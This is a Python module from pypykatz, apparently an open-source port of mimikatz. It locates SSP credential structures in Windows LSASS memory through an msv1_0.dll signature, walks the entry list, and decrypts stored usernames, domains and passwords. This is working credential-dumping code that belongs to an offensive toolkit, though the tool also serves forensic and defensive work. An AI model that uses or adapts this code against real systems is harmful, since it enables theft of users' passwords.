#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#


import json
from pypykatz.alsadecryptor.package_commons import PackageDecryptor

class SspCredential:
	def __init__(self):
		self.credtype = 'ssp'
		self.username = None
		self.domainname = None
		self.password = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['luid'] = self.luid
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== SSP [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		return t
		
class SspDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo):
		super().__init__('Ssp', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.credentials = []

	async def find_first_entry(self):
		position = await self.find_signature('msv1_0.dll',self.decryptor_template.signature)
		ptr_entry_loc = await self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = await self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	async def add_entry(self, ssp_entry):
		c = SspCredential()
		c.luid = ssp_entry.LogonId
		c.username = await ssp_entry.credentials.Domaine.read_string(self.reader)
		c.domainname = await ssp_entry.credentials.UserName.read_string(self.reader)
		if ssp_entry.credentials.Password.Length != 0:
			if c.username.endswith('$') is True or c.domainname.endswith('$') is True:
				enc_data = await ssp_entry.credentials.Password.read_data(self.reader)
				c.password = self.decrypt_password(enc_data, bytes_expected=True)
				if c.password is not None:
					c.password = c.password.hex()
			else:
				enc_data = await ssp_entry.credentials.Password.read_data(self.reader)
				c.password = self.decrypt_password(enc_data)
		self.credentials.append(c)
	
	async def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = await self.find_first_entry()
		except Exception as e:
			self.log('Failed to find structs! Reason: %s' % e)
			return
		await self.reader.move(entry_ptr_loc)
		entry_ptr = await self.decryptor_template.list_entry.load(self.reader)
		await self.walk_list(entry_ptr, self.add_entry)